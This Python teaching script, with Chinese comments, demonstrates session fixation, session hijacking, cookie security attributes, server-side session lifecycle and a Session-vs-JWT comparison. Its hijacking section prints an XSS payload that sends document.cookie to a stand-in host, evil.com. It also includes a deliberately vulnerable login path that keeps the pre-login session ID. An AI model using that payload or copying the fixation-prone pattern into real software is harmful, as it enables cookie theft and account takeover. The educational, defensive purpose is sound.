"""
Session 安全攻防演示
演示常见的 Session 攻击方式和对应的防御措施
"""
import hashlib
import hmac
import time
import json
import base64
import os
import secrets


# ==================== 1. Session 固定攻击 (Session Fixation) ====================
class SessionFixationDemo:
    """
    攻击原理：
    1. 攻击者先访问网站，获得一个合法的 Session ID
    2. 攻击者诱骗受害者使用这个 Session ID（如通过 URL 参数）
    3. 受害者用这个 ID 登录后，攻击者就知道了受害者的 Session ID
    4. 攻击者用这个 ID 就能冒充受害者

    防御：登录后必须重新生成 Session ID
    """

    def __init__(self):
        self.sessions = {}

    def create_session(self, session_id=None):
        """创建 Session（可指定 ID - 这就是漏洞所在）"""
        if session_id is None:
            session_id = secrets.token_hex(16)
        self.sessions[session_id] = {"authenticated": False, "data": {}}
        return session_id

    def login(self, session_id, username, password, regenerate=True):
        """登录并标记 Session 为已认证"""
        if session_id not in self.sessions:
            return False, "Session 不存在"

        # 模拟验证
        if username == "admin" and password == "123":
            # 关键：登录后是否重新生成 Session ID
            if regenerate:
                # 安全做法：生成新的 Session ID
                new_id = secrets.token_hex(16)
                self.sessions[new_id] = self.sessions.pop(session_id)
                self.sessions[new_id]["authenticated"] = True
                self.sessions[new_id]["data"]["username"] = username
                return new_id, "登录成功 (Session ID 已更新)"
            else:
                # 危险做法：复用旧的 Session ID
                self.sessions[session_id]["authenticated"] = True
                self.sessions[session_id]["data"]["username"] = username
                return session_id, "登录成功 (Session ID 未更新 - 危险!)"
        return session_id, "登录失败"

    def demo(self):
        print("=" * 60)
        print("  攻击 1: Session 固定攻击 (Session Fixation)")
        print("=" * 60)

        # ---- 攻击者准备阶段 ----
        print("\n[攻击者] 访问网站，获得 Session ID")
        attacker_session = self.create_session("known_session_123")
        print(f"  攻击者获得的 Session ID: {attacker_session}")

        # ---- 攻击者诱骗受害者 ----
        print(f"\n[攻击者] 发给受害者链接: http://site.com/login?sid={attacker_session}")

        # ---- 受害者登录（不安全：不重新生成 Session ID）----
        print(f"\n[受害者] 使用攻击者给的 Session ID 登录...")
        result, msg = self.login(attacker_session, "admin", "123", regenerate=False)
        print(f"  结果: {msg}")
        print(f"  登录后的 Session ID: {result}")

        # ---- 攻击者检查 ----
        print(f"\n[攻击者] 用已知的 Session ID 访问...")
        session = self.sessions.get(attacker_session)
        if session and session.get("authenticated"):
            print(f"  攻击成功! 看到用户数据: {session['data']}")
        else:
            print(f"  攻击失败 - Session ID 已改变")

        # ---- 对比：安全的做法 ----
        print(f"\n{'='*40}")
        print(f"[安全模式] 登录后重新生成 Session ID")
        safe_session = self.create_session("another_known_123")
        print(f"  登录前 Session ID: {safe_session}")
        result, msg = self.login(safe_session, "admin", "123", regenerate=True)
        print(f"  结果: {msg}")
        print(f"  登录后 Session ID: {result}")
        print(f"  攻击者已知的 ID 已失效!")


# ==================== 2. Session 劫持 (Session Hijacking) ====================
class SessionHijackingDemo:
    """
    攻击方式：
    1. 网络嗅探：在公共 WiFi 下抓取 HTTP 流量中的 Cookie
    2. XSS 攻击：通过注入 JS 脚本窃取 document.cookie
    3. 日志泄露：Session ID 被记录在服务器日志或浏览器历史中

    防御：HTTPS、HttpOnly 标记、IP 绑定
    """

    def demo(self):
        print("\n\n" + "=" * 60)
        print("  攻击 2: Session 劫持 (Session Hijacking)")
        print("=" * 60)

        # ---- 场景 1: 网络嗅探 ----
        print("\n[场景 1] 公共 WiFi 嗅探")
        print("  HTTP 请求（明文传输）:")
        raw_request = (
            "GET /dashboard HTTP/1.1\r\n"
            "Host: bank.com\r\n"
            "Cookie: SESSIONID=abc123def456\r\n"
            "User-Agent: Mozilla/5.0\r\n"
        )
        print(f"  {repr(raw_request)}")
        print(f"  攻击者在同一 WiFi 下用 Wireshark 抓包即可获取 SESSIONID")
        print(f"  防御: 使用 HTTPS 加密传输")

        # ---- 场景 2: XSS 窃取 ----
        print("\n[场景 2] XSS 窃取 Cookie")
        xss_payload = '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>'
        print(f"  攻击者注入: {xss_payload}")
        print(f"  浏览器执行后会把 Cookie 发送到攻击者服务器")
        print(f"  防御: Cookie 设置 HttpOnly 标记（JS 无法读取）")

        # ---- 场景 3: Session ID 预测 ----
        print("\n[场景 3] Session ID 可预测")
        # 不安全的 Session ID 生成（可预测）
        weak_ids = []
        for i in range(5):
            weak_id = hashlib.md5(f"user_{i}".encode()).hexdigest()
            weak_ids.append(weak_id)
        print(f"  不安全的 Session ID（MD5 哈希，可预测）:")
        for i, sid in enumerate(weak_ids):
            print(f"    user_{i} -> {sid}")
        print(f"  攻击者可以枚举生成 Session ID")
        print(f"  防御: 使用密码学安全的随机数 (secrets 模块)")

        # 安全的 Session ID
        print(f"\n  安全的 Session ID（密码学随机）:")
        for i in range(3):
            print(f"    {secrets.token_hex(32)}")


# ==================== 3. Cookie 安全属性演示 ====================
class CookieSecurityDemo:
    """
    Cookie 的安全属性：
    - HttpOnly: 禁止 JS 访问（防 XSS 窃取）
    - Secure: 只在 HTTPS 下发送（防明文泄露）
    - SameSite: 限制跨站发送（防 CSRF）
    - Path/Domain: 限制 Cookie 的作用范围
    - Max-Age/Expires: 设置过期时间
    """

    def demo(self):
        print("\n\n" + "=" * 60)
        print("  Cookie 安全属性详解")
        print("=" * 60)

        cookies = [
            {
                "name": "不安全的 Cookie",
                "header": "Set-Cookie: SESSIONID=abc123",
                "risk": "JS 可读取、HTTP 明文传输、跨站发送",
            },
            {
                "name": "HttpOnly",
                "header": "Set-Cookie: SESSIONID=abc123; HttpOnly",
                "effect": "JS 无法通过 document.cookie 读取",
                "risk": "仍可被网络嗅探（HTTP 明文）",
            },
            {
                "name": "Secure",
                "header": "Set-Cookie: SESSIONID=abc123; Secure",
                "effect": "只在 HTTPS 连接下发送",
                "risk": "仍可被 XSS 窃取（JS 可读）",
            },
            {
                "name": "SameSite=Strict",
                "header": "Set-Cookie: SESSIONID=abc123; SameSite=Strict",
                "effect": "跨站请求完全不发送 Cookie",
                "risk": "用户体验下降（从外部链接点进来也不带 Cookie）",
            },
            {
                "name": "SameSite=Lax",
                "header": "Set-Cookie: SESSIONID=abc123; SameSite=Lax",
                "effect": "跨站 GET 请求发送，POST 不发送",
                "risk": "GET 型 CSRF 仍可利用",
            },
            {
                "name": "最佳实践（全部组合）",
                "header": "Set-Cookie: SESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600",
                "effect": "综合防御 XSS、嗅探、CSRF",
                "risk": "仍需配合 HTTPS 和服务端验证",
            },
        ]

        for c in cookies:
            print(f"\n  [{c['name']}]")
            print(f"    报文: {c['header']}")
            if "effect" in c:
                print(f"    效果: {c['effect']}")
            print(f"    风险: {c['risk']}")


# ==================== 4. 服务端 Session 管理 ====================
class ServerSessionManager:
    """
    演示服务端 Session 的完整生命周期管理：
    - 创建、读取、更新、销毁
    - 过期清理
    - 并发安全
    """

    def __init__(self, max_age=3600):
        self.sessions = {}
        self.max_age = max_age  # Session 有效期（秒）

    def create(self, data: dict = None) -> str:
        session_id = secrets.token_hex(32)  # 64 字符的随机 ID
        self.sessions[session_id] = {
            "created": time.time(),
            "last_access": time.time(),
            "data": data or {},
        }
        return session_id

    def get(self, session_id: str) -> dict | None:
        session = self.sessions.get(session_id)
        if not session:
            return None

        # 检查是否过期
        if time.time() - session["last_access"] > self.max_age:
            self.destroy(session_id)
            return None

        session["last_access"] = time.time()
        return session["data"]

    def update(self, session_id: str, data: dict):
        if session_id in self.sessions:
            self.sessions[session_id]["data"].update(data)

    def destroy(self, session_id: str):
        self.sessions.pop(session_id, None)

    def cleanup_expired(self):
        """清理所有过期的 Session"""
        now = time.time()
        expired = [
            sid for sid, s in self.sessions.items()
            if now - s["last_access"] > self.max_age
        ]
        for sid in expired:
            self.destroy(sid)
        return len(expired)

    def demo(self):
        print("\n\n" + "=" * 60)
        print("  服务端 Session 生命周期管理")
        print("=" * 60)

        # 创建
        sid = self.create({"username": "admin", "role": "admin"})
        print(f"\n  创建 Session: {sid[:16]}...")

        # 读取
        data = self.get(sid)
        print(f"  读取 Session: {data}")

        # 更新
        self.update(sid, {"last_page": "/dashboard"})
        data = self.get(sid)
        print(f"  更新后: {data}")

        # 模拟过期
        print(f"\n  模拟 Session 过期 (设置 max_age=0)...")
        self.max_age = 0
        time.sleep(0.1)
        data = self.get(sid)
        print(f"  读取已过期的 Session: {data}")

        # 清理
        self.max_age = 3600
        for i in range(5):
            self.create({"user": f"bot_{i}"})
        count = self.cleanup_expired()
        print(f"\n  清理了 {count} 个过期 Session")
        print(f"  剩余 Session 数: {len(self.sessions)}")


# ==================== 5. Session vs JWT 对比 ====================
def session_vs_jwt():
    print("\n\n" + "=" * 60)
    print("  Session vs JWT 对比")
    print("=" * 60)

    comparison = """
    对比项         Session (有状态)              JWT (无状态)
    ─────────────────────────────────────────────────────────────
    存储位置       服务端 (内存/Redis/DB)        客户端 (Cookie/LocalStorage)
    服务端是否     是 - 每次请求都要              否 - 只需验证签名
    需要查询       查询 Session 存储

    扩展性         差 - 多机需要共享              好 - 任何服务器都能验证
                   Session 存储 (如 Redis)

    吊销能力       强 - 删除服务端记录即可        弱 - 过期前无法主动吊销
                                               需要黑名单机制

    安全性         较高 - 敏感数据不外泄          较低 - payload 可被解码
                   Session ID 无意义              不能存敏感信息

    跨域支持       需要配置 Cookie 域             天然支持 (放在 Header)

    适用场景       传统 Web 应用                  前后端分离 / 微服务 / APP
                   对安全性要求高                  需要跨域 / 无状态
    """
    print(comparison)

    # 简单的 JWT 模拟
    print("  [模拟] 简单的 JWT 结构:")
    header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
    payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "exp": 9999999999}).encode()).decode().rstrip("=")
    secret = "my-secret-key"
    signature = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).hexdigest()[:32]

    print(f"    Header:    {header}")
    print(f"    Payload:   {payload}")
    print(f"    Signature: {signature}")
    print(f"    完整 JWT:  {header}.{payload}.{signature}")
    print(f"    解码 Header:  {json.dumps({'alg': 'HS256', 'typ': 'JWT'})}")
    print(f"    解码 Payload: {json.dumps({'sub': 'admin', 'exp': 9999999999})}")


# ==================== 主程序 ====================
if __name__ == "__main__":
    print("=" * 60)
    print("  Session 安全攻防与实现原理")
    print("=" * 60)

    # 1. Session 固定攻击
    SessionFixationDemo().demo()

    # 2. Session 劫持
    SessionHijackingDemo().demo()

    # 3. Cookie 安全属性
    CookieSecurityDemo().demo()

    # 4. 服务端 Session 管理
    ServerSessionManager().demo()

    # 5. Session vs JWT
    session_vs_jwt()

    print("\n\n演示结束。")
